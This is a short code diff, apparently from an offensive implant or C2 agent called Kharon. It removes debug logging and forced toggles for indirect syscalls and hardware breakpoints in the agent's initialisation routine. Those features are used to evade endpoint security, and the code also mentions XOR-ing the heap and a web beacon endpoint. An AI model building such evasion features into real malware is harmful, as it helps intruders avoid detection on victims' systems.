@@ -121,9 +121,6 @@ auto DECLFN Kharon::Init(
 
     for ( INT i = 0; i < syLast -1; i++ ) {
         Sys->Fetch( i );
-        KhDbgz( "#%d syscall base %p", i, Sys->Ext[i].Address );
-        KhDbgz( "#%d instruction  %p", i, Sys->Ext[i].Instruction );
-        KhDbgz( "#%d ssn %X", i, Sys->Ext[i].ssn );
     }
 
     /* ========= [ key generation to xor heap ] ========= */
@@ -243,16 +240,6 @@ auto DECLFN Kharon::Init(
     KhDbgz( "endpoint: %S", Tsp->Web.EndPoint );
     KhDbgz( "user agent: %S", Tsp->Web.UserAgent );
     KhDbgz( "secure: %d", Tsp->Web.Secure );
-
-    KhDbgz( "hardware breakpoint enabled: %d", Hw->Enabled );
-    KhDbgz( "hardware breakpoint enabled: %d", KH_HARDWARE_BREAKPOINT_ENABLED );
-    KhDbgz( "syscall enabled: %d", Sys->Enabled );
-    KhDbgz( "syscall enabled: %d", KH_INDIRECT_SYSCALL_ENABLED );
-
-    Sys->Enabled = TRUE;
-    Hw->Enabled  = TRUE;
-    KhDbgz( "syscall enabled: %d", Sys->Enabled );
-    KhDbgz( "hardware breakpoint enabled: %d", Hw->Enabled );
 
     KhDbgz( "collected informations from environment" );
 
